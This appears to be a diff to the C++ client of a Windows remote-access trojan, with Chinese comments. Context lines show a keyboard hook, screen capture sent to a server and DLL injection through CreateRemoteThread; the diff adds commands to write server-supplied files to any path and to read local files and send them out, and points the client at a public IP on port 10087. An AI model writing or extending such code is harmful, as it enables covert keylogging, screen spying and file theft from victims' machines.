@@ -10,6 +10,7 @@
 #include"DATA.h"
 #include<thread>
 #include<TlHelp32.h>
+#include <fstream>
 #pragma comment(lib,"C:/Users/19100/Desktop/Remote/bin/HOOK.lib")
 using namespace std;
 int mykeyboardhook(HWND hwnd);
@@ -144,7 +145,7 @@ bool sendcapture(SOCKET s)
         }
 
         //向服务端发送SCREEN数据
-        senddata(s, CLIENT_SCREEN_BACK, (char*)pscreendata, bufsize+8);
+        senddata(s, CLIENT_SCREEN_BACK, (char*)pscreendata, bufsize);
 
 
     }
@@ -189,7 +190,9 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
         DATA drbuf;
         bret = recvdata(s, (char*)&drbuf, sizeof(unsigned int) * 2);
         if (bret <= 0) return 0;
-        
+
+        senddatahead(s, Client_BEAT);
+
         dwrecvticket = GetTickCount();   //收到包 刷新最后收包时间戳
 
         //后面有数据继续收取
@@ -335,6 +338,57 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
                 //开辟远线程,使目标进程调用LoadLibrary并通过开辟空间获取注入dll的路径作为参数
                 HANDLE hRemotethread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)destaddr, lpaddr, 0, NULL);
             }
+
+            //文件接受
+            else if (drbuf.type == SERVER_FILE_UP)
+            {
+                
+                senddatahead(s, CLIENT_FILE_DOWN);
+                
+                if(drbuf.length>0)
+                {
+                    filedatastruct* fdatastruct = (filedatastruct*)pdata;
+                    ofstream file;
+                    int a = drbuf.length;
+
+                    file.open(fdatastruct->despath, ios::out | ios::app | ios::binary, _SH_DENYRW);
+
+                    file.write(fdatastruct->filedata, fdatastruct->datasize);
+                    file.close();
+                }
+
+            }
+
+            //文件发送
+            else if (drbuf.type == CLIENT_FILE_DOWN)
+            {
+                if (drbuf.length == 0)
+                {
+                    senddatahead(s, CLIENT_FILE_DOWN);
+                }
+                if (drbuf.length > 0)
+                {
+                    filedatastruct* fdatastruct = (filedatastruct*)pdata;
+                    ifstream file;
+
+                    file.open(fdatastruct->sourcepath, ios::in|ios::binary, _SH_DENYRW);
+
+                    filedatastruct* fds = new filedatastruct;
+                    memset(fds, 0, sizeof(filedatastruct));
+                    memcpy(fds->despath, fdatastruct->despath, sizeof(fdatastruct->despath));
+  
+                    while (true)
+                    {
+                        file.read(fds->filedata, TRANSFER_SIZE);
+                        fds->datasize = sizeof(fds->filedata);
+                        
+                        senddata(s, SERVER_FILE_UP, (char*)fds, sizeof(filedatastruct));
+                        if (file.eof()) break;
+                    }
+                    delete fds;
+                    file.close();
+                }
+            }
         }
         if (pdata != NULL)
         {
@@ -470,7 +524,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
             addr.sin_family = AF_INET;
 
 
-            addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
+            addr.sin_addr.S_un.S_addr = inet_addr("39.108.3.173");
             addr.sin_port = htons(10087);
 
             connect(s, (sockaddr*)&addr, length);
